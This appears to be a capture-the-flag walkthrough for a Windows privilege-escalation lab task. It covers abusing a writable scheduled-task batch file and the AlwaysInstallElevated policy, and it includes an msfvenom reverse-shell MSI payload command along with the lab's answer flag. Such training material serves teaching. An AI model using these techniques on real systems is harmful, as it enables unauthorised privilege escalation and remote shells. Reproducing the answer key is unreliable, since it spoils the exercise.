# Task 04: Other Quick Wins

---

## Stage A: Original Task Content & Briefing Summary

Task 04 covers high-impact Windows misconfigurations that provide rapid, reliable privilege escalation:
1. **Insecure Scheduled Tasks:**
   * In Windows, scheduled tasks are configured to run under specific user contexts (e.g. `taskusr1`, `SYSTEM`).
   * By querying task definitions (`schtasks /query /fo LIST /v`), operators inspect the `Task To Run` parameter.
   * If the executable script referenced by the task (e.g. `C:\tasks\schtask.bat`) has weak Discretionary Access Control Lists (DACLs) granting write `(W)` or modify `(M)` permissions to `BUILTIN\Users`, an attacker can overwrite the script with custom commands and trigger execution immediately via `schtasks /run /tn <task>`.
2. **AlwaysInstallElevated Policy:**
   * A Windows feature that allows unprivileged standard users to install Windows Installer packages (`.msi`) with elevated system privileges (`NT AUTHORITY\SYSTEM`).
   * Requires both of the following registry keys to be configured with a value of `1`:
     * `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
     * `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
   * Attackers generate an MSI payload (`msfvenom -p windows/x64/shell_reverse_tcp -f msi -o payload.msi`) and execute it with `msiexec /quiet /qn /i payload.msi`, triggering elevated execution.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Scheduled Task Execution Context:** Unlike Linux cron jobs that can only be waited on, Windows scheduled tasks can frequently be triggered on-demand using `schtasks /run /tn <taskname>` provided the current user has permission to initiate the task.
* **Permission Auditing via `icacls`:** Always check permissions using `icacls <filepath>`:
  * `(F)` = Full Access
  * `(M)` = Modify Access (allows writing and modifying contents)
  * `(W)` = Write Access
  * If `BUILTIN\Users:(F)` or `(M)` is present on a scheduled script, privilege escalation is trivial.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Query the scheduled task `vulntask` using `schtasks /query /tn vulntask /fo list /v`.
* **Tier 2 Hint:** Check permissions on the target batch file using `icacls`. Overwrite the batch file to copy the flag from `taskusr1`'s desktop to a readable directory.
* **Tier 3 Hint:** The flag for `taskusr1` is `THM{TASK_COMPLETED}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating Scheduled Tasks:
```cmd
schtasks /query /tn vulntask /fo list /v
```
* **Key Properties Observed:**
  * `TaskName:` `\vulntask`
  * `Run As User:` `taskusr1`
  * `Task To Run:` `C:\tasks\schtask.bat`

### 2. Checking Permissions on `C:\tasks\schtask.bat`:
```cmd
icacls C:\tasks\schtask.bat
```
* **Output:**
  ```
  C:\tasks\schtask.bat BUILTIN\Users:(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
  ```
* **Analysis:** `BUILTIN\Users` has `(F)` (Full Access), allowing arbitrary file modification.

### 3. Modifying the Script to Harvest the Flag:
```cmd
echo copy C:\Users\taskusr1\Desktop\flag.txt C:\Users\Public\flag.txt > C:\tasks\schtask.bat
```

### 4. Running the Task On-Demand:
```cmd
schtasks /run /tn vulntask
type C:\Users\Public\flag.txt
```
* **Observed Flag:** `THM{TASK_COMPLETED}`

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the taskusr1 flag?
  * **Answer:** `THM{TASK_COMPLETED}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed task execution under `taskusr1` authority.
* Verified `schtask.bat` overwriting and retrieved flag `THM{TASK_COMPLETED}`.

---

## Stage G: Key Educational Takeaway

When administrative tasks execute scripts stored in non-standard directories (such as `C:\tasks\` rather than protected paths like `C:\Windows\System32`), default inheritance rules frequently grant standard users modify permissions, creating instant on-demand privilege escalation vectors.
